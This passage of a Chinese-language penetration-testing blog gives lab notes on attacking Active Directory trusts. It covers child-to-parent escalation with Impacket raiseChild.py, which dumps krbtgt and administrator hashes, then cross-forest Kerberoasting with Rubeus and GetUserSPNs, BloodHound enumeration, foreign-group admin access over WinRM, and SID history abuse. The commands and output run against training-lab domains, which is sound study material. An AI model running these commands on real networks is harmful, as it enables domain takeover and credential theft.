class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file nkYjGWDZ.exe</span><br><span class="line">[*] Opening SVCManager on 172.16.5.5.....</span><br><span class="line">[*] Creating service eTCU on 172.16.5.5.....</span><br><span class="line">[*] Starting service eTCU.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; hostname</span><br><span class="line">ACADEMY-EA-DC01</span><br></pre></td></tr></table></figure>

<h4 id="Impacket-raiseChild-py"><a href="#Impacket-raiseChild-py" class="headerlink" title="Impacket raiseChild.py"></a>Impacket raiseChild.py</h4><p>Impacket 还具有<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py">raiseChild.py</a>工具，它可以自动从子域升级到父域。</p>
<p><code>-c</code> 或 <code>-target-exec</code> 获取目标机器上获得一个交互式会话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Forest FQDN is: INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL</span><br><span class="line">[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519</span><br><span class="line">[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::</span><br><span class="line">LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8</span><br><span class="line">[*] Getting credentials for INLANEFREIGHT.LOCAL</span><br><span class="line">INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::</span><br><span class="line">INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d</span><br><span class="line">[*] Target User account name is administrator</span><br><span class="line">INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6</span><br><span class="line">[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file BnEGssCE.exe</span><br><span class="line">[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....</span><br><span class="line">[*] Creating service UVNb on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....</span><br><span class="line">[*] Starting service UVNb.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>

<p>工作流程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 输入：</span><br><span class="line"># 1) 子域管理员凭据（密码、哈希或 aesKey），格式为“域/用户名[:密码]”，指定的域必须是域 FQDN。</span><br><span class="line"># 2) 可选路径名，用于保存生成的黄金票证（-w 开关）</span><br><span class="line"># 3) 可选目标用户 RID，用于获取凭据（-targetRID 开关），默认为管理员。</span><br><span class="line"># 4) 可选 PSEXEC 目标，具有目标用户权限（-target-exec 开关）。默认为企业管理员。</span><br><span class="line">#</span><br><span class="line"># 流程：</span><br><span class="line"># 1) 找出子域控制器的位置并获取其信息（通过 [MS-NRPC]）</span><br><span class="line"># 2) 找出林的 FQDN（通过 [MS-NRPC]）</span><br><span class="line"># 3) 获取林的企业管理员 SID（通过 [MS-LSAT]）</span><br><span class="line"># 4) 获取子域的 krbtgt 凭据（通过 [MS-DRSR]）</span><br><span class="line"># 5) 在 KERB_VALIDATION_INFO 的 ExtraSids 数组中创建一个黄金票证，指定 3) 中的 SID，并将有效期设置为 10 年后</span><br><span class="line"># 6) 使用生成的票证登录林并获取目标用户信息（默认为 krbtgt/admin）</span><br><span class="line"># 7) 如果指定了文件，则以 ccache 格式保存黄金票证</span><br><span class="line"># 8) 如果指定了目标，则启动 PSEXEC shell</span><br><span class="line">#</span><br><span class="line"># 输出：</span><br><span class="line"># 1) 目标用户凭据（林的 krbtgt/admin 凭据）默认情况下)</span><br><span class="line"># 2) 在 ccache 中保存的黄金票，用于将来的乐趣和收益</span><br><span class="line"># 3) 在 target-exec 参数处使用目标用户权限 (默认情况下为企业管理员权限) 的 PSExec Shell。</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Attacking-Domain-Trusts-Cross-Forest-Trust-Abuse"><a href="#Attacking-Domain-Trusts-Cross-Forest-Trust-Abuse" class="headerlink" title="Attacking Domain Trusts - Cross-Forest Trust Abuse"></a>Attacking Domain Trusts - Cross-Forest Trust Abuse</h1><h2 id="Cross-Forest-Kerberoasting-Windows"><a href="#Cross-Forest-Kerberoasting-Windows" class="headerlink" title="Cross-Forest Kerberoasting - Windows"></a>Cross-Forest Kerberoasting - Windows</h2><p>Kerberos 攻击（例如 Kerberoasting 和 ASREPRoasting）可以跨信任执行，具体取决于信任方向。如果您位于具有入站或双向域&#x2F;林信任的域中，则可能会执行各种攻击以获得立足点。</p>
<h3 id="Enumerating-Accounts-for-Associated-SPNs-PowerView"><a href="#Enumerating-Accounts-for-Associated-SPNs-PowerView" class="headerlink" title="Enumerating Accounts for Associated SPNs -PowerView"></a>Enumerating Accounts for Associated SPNs -PowerView</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-SPN</span> <span class="literal">-Domain</span> FREIGHTLOGISTICS.LOCAL | <span class="built_in">select</span> SamAccountName</span><br><span class="line"></span><br><span class="line">samaccountname</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">krbtgt</span><br><span class="line">mssqlsvc</span><br></pre></td></tr></table></figure>

<p>检查此帐户是否是目标域中域管理员组的成员</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-Domain</span> FREIGHTLOGISTICS.LOCAL <span class="literal">-Identity</span> mssqlsvc |<span class="built_in">select</span> samaccountname,memberof</span><br><span class="line"></span><br><span class="line">samaccountname memberof</span><br><span class="line"><span class="literal">--------------</span> <span class="literal">--------</span></span><br><span class="line">mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL</span><br></pre></td></tr></table></figure>

<p>显示此帐户是目标域中域管理员组的成员，因此如果可以对其进行 Kerberoast 攻击并离线破解哈希，拥有目标域的完全管理员权限。</p>
<h3 id="Kerberoasting-Rubeus"><a href="#Kerberoasting-Rubeus" class="headerlink" title="Kerberoasting - Rubeus"></a>Kerberoasting - Rubeus</h3><p>使用<code>Rubeus</code>执行跨信任的 Kerberoasting 攻击，需要加上<code>/domain:</code>标志指定目标域。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span></span><br><span class="line"></span><br><span class="line">[*] Action: Kerberoasting</span><br><span class="line"></span><br><span class="line">[*] NOTICE: AES hashes will be returned <span class="keyword">for</span> AES<span class="literal">-enabled</span> accounts.</span><br><span class="line">[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC <span class="keyword">for</span> these accounts.</span><br><span class="line"></span><br><span class="line">[*] Target User            : mssqlsvc</span><br><span class="line">[*] Target Domain          : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">[*] Searching path <span class="string">&#x27;LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] Total kerberoastable users : <span class="number">1</span></span><br><span class="line"></span><br><span class="line">[*] SamAccountName         : mssqlsvc</span><br><span class="line">[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL</span><br><span class="line">[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:<span class="number">1433</span></span><br><span class="line">[*] PwdLastSet             : <span class="number">3</span>/<span class="number">24</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">47</span>:<span class="number">52</span> PM</span><br><span class="line">[*] Supported ETypes       : RC4_HMAC_DEFAULT</span><br><span class="line">[*] Hash                   : <span class="variable">$krb5tgs</span><span class="variable">$23</span><span class="variable">$</span>*mssqlsvc<span class="variable">$FREIGHTLOGISTICS</span>.LOCAL<span class="variable">$MSSQLsvc</span>/sql01.freightlogstics:<span class="number">1433</span>@FREIGHTLOGISTICS.LOCAL*<span class="variable">$</span>&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Cross-Forest-Kerberoasting-Linux"><a href="#Cross-Forest-Kerberoasting-Linux" class="headerlink" title="Cross-Forest Kerberoasting - Linux"></a>Cross-Forest Kerberoasting - Linux</h2><h3 id="Impacket-GetUserSPNs-py"><a href="#Impacket-GetUserSPNs-py" class="headerlink" title="Impacket GetUserSPNs.py"></a>Impacket GetUserSPNs.py</h3><p>提取和列出 Active Directory 中用户的服务主体名称</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -request</span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation </span><br><span class="line">-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------</span><br><span class="line">MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  &lt;never&gt;               </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>hashcat crack 13100，如果破解成功，能够<code>FREIGHTLOGISTICS.LOCAL</code>以域管理员身份登录域。</p>
<blockquote>
<p>假设可以跨信任进行 Kerberoast 攻击，但在当前域中已经没有其他选择。在这种情况下，尝试使用破解的密码进行一次密码喷洒也是值得的，因为如果同一个管理员负责两个域，则有可能将其用于其他服务帐户。</p>
</blockquote>
<h2 id="Hunting-Foreign-Group-Membership-BloodHound"><a href="#Hunting-Foreign-Group-Membership-BloodHound" class="headerlink" title="Hunting Foreign Group Membership - BloodHound"></a>Hunting Foreign Group Membership - BloodHound</h2><p>可能不时会看到一个域中的用户或管理员作为另一个域中组的成员。由于只有<code>Domain Local Groups</code>允许来自其林外的用户，因此在处理双向林信任关系时，看到来自域 A 的高权限用户作为域 B 中内置管理员组的成员并不罕见。</p>
<p>在一些评估中，客户可能会为配置一个虚拟机，该虚拟机从 DHCP 获取 IP，并配置为使用内部域的 DNS。处于一个攻击主机上，而在其他情况下没有配置 DNS。在这种情况下，需要编辑<code>resolv.conf</code>文件来运行此工具，因为它需要目标域控制器的 DNS 主机名，而不是 IP 地址。</p>
<h3 id="Adding-INLANEFREIGHT-LOCAL-to-etc-resolv-conf"><a href="#Adding-INLANEFREIGHT-LOCAL-to-etc-resolv-conf" class="headerlink" title="Adding INLANEFREIGHT.LOCAL to &#x2F;etc&#x2F;resolv.conf"></a>Adding INLANEFREIGHT.LOCAL to &#x2F;etc&#x2F;resolv.conf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/resolv.conf </span><br><span class="line"></span><br><span class="line"># Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)</span><br><span class="line">#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN</span><br><span class="line"># 127.0.0.53 is the systemd-resolved stub resolver.</span><br><span class="line"># run &quot;resolvectl status&quot; to see details about the actual nameservers.</span><br><span class="line"></span><br><span class="line">#nameserver 1.1.1.1</span><br><span class="line">#nameserver 8.8.8.8</span><br><span class="line">domain INLANEFREIGHT.LOCAL</span><br><span class="line">nameserver 172.16.5.5</span><br></pre></td></tr></table></figure>

<h3 id="bloodhound-python-Against-INLANEFREIGHT-LOCAL"><a href="#bloodhound-python-Against-INLANEFREIGHT-LOCAL" class="headerlink" title="bloodhound-python Against INLANEFREIGHT.LOCAL"></a>bloodhound-python Against INLANEFREIGHT.LOCAL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2</span><br><span class="line"></span><br><span class="line">INFO: Found AD domain: inlanefreight.local</span><br><span class="line">INFO: Connecting to LDAP server: ACADEMY-EA-DC01</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 2 domains in the forest</span><br><span class="line">INFO: Found 559 computers</span><br><span class="line">INFO: Connecting to LDAP server: ACADEMY-EA-DC01</span><br><span class="line">INFO: Found 2950 users</span><br><span class="line">INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">INFO: Found 183 groups</span><br><span class="line">INFO: Found 2 trusts</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>重复相同的过程，这次填写<code>FREIGHTLOGISTICS.LOCAL</code>域名的详细信息。</p>
<h3 id="Adding-FREIGHTLOGISTICS-LOCAL-to-etc-resolv-conf"><a href="#Adding-FREIGHTLOGISTICS-LOCAL-to-etc-resolv-conf" class="headerlink" title="Adding FREIGHTLOGISTICS.LOCAL to &#x2F;etc&#x2F;resolv.conf"></a>Adding FREIGHTLOGISTICS.LOCAL to &#x2F;etc&#x2F;resolv.conf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/resolv.conf </span><br><span class="line"></span><br><span class="line"># Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)</span><br><span class="line">#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN</span><br><span class="line"># 127.0.0.53 is the systemd-resolved stub resolver.</span><br><span class="line"># run &quot;resolvectl status&quot; to see details about the actual nameservers.</span><br><span class="line"></span><br><span class="line">#nameserver 1.1.1.1</span><br><span class="line">#nameserver 8.8.8.8</span><br><span class="line">domain FREIGHTLOGISTICS.LOCAL</span><br><span class="line">nameserver 172.16.5.238</span><br></pre></td></tr></table></figure>

<h3 id="bloodhound-python-Against-FREIGHTLOGISTICS-LOCAL"><a href="#bloodhound-python-Against-FREIGHTLOGISTICS-LOCAL" class="headerlink" title="bloodhound-python Against FREIGHTLOGISTICS.LOCAL"></a>bloodhound-python Against FREIGHTLOGISTICS.LOCAL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2</span><br><span class="line"></span><br><span class="line">INFO: Found AD domain: freightlogistics.local</span><br><span class="line">INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains in the forest</span><br><span class="line">INFO: Found 5 computers</span><br><span class="line">INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL</span><br><span class="line">INFO: Found 9 users</span><br><span class="line">INFO: Connecting to GC LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL</span><br><span class="line">INFO: Found 52 groups</span><br><span class="line">INFO: Found 1 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br></pre></td></tr></table></figure>

<p>上传第二组数据（每个 JSON 文件或一个 zip 文件）后，可以单击<code>Users with Foreign Domain Group Membership</code>选项卡下的<code>Analysis</code>并选择源域为<code>INLANEFREIGHT.LOCAL</code>。在这里，看到 INLANEFREIGHT.LOCAL 域的内置管理员帐户是之前看到的 FREIGHTLOGISTICS.LOCAL 域中内置管理员组的成员。</p>
<h3 id="Viewing-Dangerous-Rights-through-BloodHound"><a href="#Viewing-Dangerous-Rights-through-BloodHound" class="headerlink" title="Viewing Dangerous Rights through BloodHound"></a>Viewing Dangerous Rights through BloodHound</h3><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729255916729.png" alt="图像"></p>
<h2 id="Admin-Password-Re-Use-Group-Membership"><a href="#Admin-Password-Re-Use-Group-Membership" class="headerlink" title="Admin Password Re-Use &amp; Group Membership"></a>Admin Password Re-Use &amp; Group Membership</h2><p>有时，会遇到这样的情况：同一家公司的管理员管理着双向林信任。如果可以接管域 A 并获取内置管理员帐户（或域 A 中的企业管理员或域管理员组的一部分帐户）的明文密码或 NT Hash，而域 B 具有同名的高权限帐户，则值得检查两个林之间的密码重用情况。我偶尔会遇到这样的问题，例如，域 A 有一个名为域管理员<code>adm_bob.smith</code>组中的用户，而域 B 有一个名为的用户<code>bsmith_admin</code>。有时，用户会在两个域中使用相同的密码，而拥有域 A 会立即赋予我对域 B 的完全管理权限。</p>
<p>还可以将域 A 中的用户或管理员视为域 B 中某个组的成员。仅<code>Domain Local Groups</code>允许来自其林外的安全主体。可能会将域 A 中的域管理员或企业管理员视为双向林信任关系中域 B 中内置管理员组的成员。如果可以接管域 A 中的此管理员用户，根据组成员身份获得对域 B 的完全管理访问权限。</p>
<h3 id="enum-9"><a href="#enum-9" class="headerlink" title="enum"></a>enum</h3><p>可以使用 PowerView 函数<a target="_blank" rel="noopener" href="https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainForeignGroupMember">Get-DomainForeignGroupMember</a>来枚举不属于该域的用户组，也称为<code>foreign group membership</code>。让针对<code>FREIGHTLOGISTICS.LOCAL</code>具有外部双向林信任的域尝试此操作。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainForeignGroupMember</span> <span class="literal">-Domain</span> FREIGHTLOGISTICS.LOCAL</span><br><span class="line"></span><br><span class="line">GroupDomain             : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">GroupName               : Administrators</span><br><span class="line">GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL</span><br><span class="line">MemberDomain            : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">MemberName              : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-500</span></span><br><span class="line">MemberDistinguishedName : CN=S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-500</span>,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS</span><br><span class="line">                          TICS,DC=LOCAL</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Convert-SidToName</span> S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-500</span></span><br><span class="line"></span><br><span class="line">INLANEFREIGHT\administrator</span><br></pre></td></tr></table></figure>

<p>上述命令输出显示内置管理员组<code>FREIGHTLOGISTICS.LOCAL</code>具有域的内置管理员帐户<code>INLANEFREIGHT.LOCAL</code>作为成员。</p>
<h3 id="verify"><a href="#verify" class="headerlink" title="verify"></a>verify</h3><p>可以使用<code>Enter-PSSession</code>cmdlet 通过 WinRM 进行连接来验证此访问权限。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-EA-DC03</span>.FREIGHTLOGISTICS.LOCAL <span class="literal">-Credential</span> INLANEFREIGHT\administrator</span><br><span class="line"></span><br><span class="line">[<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC03.FREIGHTLOGISTICS.LOCAL</span>]: <span class="built_in">PS</span> C:\Users\administrator.INLANEFREIGHT\Documents&gt; whoami</span><br><span class="line">inlanefreight\administrator</span><br><span class="line"></span><br><span class="line">[<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC03.FREIGHTLOGISTICS.LOCAL</span>]: <span class="built_in">PS</span> C:\Users\administrator.INLANEFREIGHT\Documents&gt; ipconfig /all</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line">   Host Name . . . . . . . . . . . . : ACADEMY<span class="literal">-EA-DC03</span></span><br><span class="line">   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">   Node <span class="built_in">Type</span> . . . . . . . . . . . . : Hybrid</span><br><span class="line">   IP Routing Enabled. . . . . . . . : No</span><br><span class="line">   WINS Proxy Enabled. . . . . . . . : No</span><br><span class="line">   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL</span><br></pre></td></tr></table></figure>

<p>从上面的命令输出中，可以看到，已成功<code>FREIGHTLOGISTICS.LOCAL</code>使用域中的管理员帐户<code>INLANEFREIGHT.LOCAL</code>跨双向林信任对域中的域控制器进行了身份验证。在控制域后，这可以快速获得成功，并且如果在评估期间存在双向林信任情况并且第二个林在范围内，则始终值得检查。</p>
<h2 id="SID-History-Abuse"><a href="#SID-History-Abuse" class="headerlink" title="SID History Abuse"></a>SID History Abuse</h2><p>SID 历史记录也可能被跨林信任滥用。如果用户从一个林迁移到另一个林，并且未启用 SID 筛选，则有可能添加来自另一个林的 SID，并且此 SID 将在跨信任进行身份验证时添加到用户的令牌中。如果将林 A 中具有管理权限的帐户的 SID 添加到林 B 中帐户的 SID 历史记录属性中，假设他们可以跨林进行身份验证，那么此帐户在访问合作伙伴林中的资源时将具有管理权限。</p>
<p>在下图中，可以看到 <code>jjones</code> 用户从 <code>INLANEFREIGHT.LOCAL</code> 域迁移到另一个林中的 <code>CORP.LOCAL</code> 域的示例。如果在进行迁移时未启用 SID 过滤，并且用户在 <code>INLANEFREIGHT.LOCAL</code> 域中拥有管理权限（或任何类型的相关权利，如 ACE 条目、访问共享等），则他们将在成为新域（第二个林中的 <code>CORP.LOCAL</code>）的成员时保留其在 <code>INLANEFREIGHT.LOCAL</code> 中的管理权限&#x2F;访问权限。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729256427161.png" alt="图像"></p>

	  <!--
<div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>
-->
	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2025/09/01/blockchain/Ethernaut/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/10/30/pentest/privesc/Windows Privilege Escalation/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
